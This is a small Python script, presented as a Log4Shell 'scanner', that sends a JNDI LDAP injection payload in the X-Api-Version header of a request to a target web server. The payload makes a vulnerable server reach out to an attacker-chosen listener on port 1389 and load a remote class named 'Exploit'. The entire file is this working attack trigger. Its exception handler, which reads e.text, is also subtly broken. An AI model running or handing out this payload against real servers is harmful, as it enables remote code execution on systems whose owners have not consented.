#!/bin/python3
# log4shell_scanner.py <http(s)://ip_or_hostname[:port]> <listener_ip>

import sys
import requests

vuln_webserver = sys.argv[1]
listener_ip = sys.argv[2]

s = requests.Session()
s.headers = {'X-Api-Version': r'${jndi:ldap://%s:1389/Exploit}'%listener_ip}
try:
    print(f"probing {vuln_webserver}...")
    r = s.get(f"{vuln_webserver}", verify=False, timeout=1)
    print(r.text)
except Exception as e:
    print (e.text)

s.close()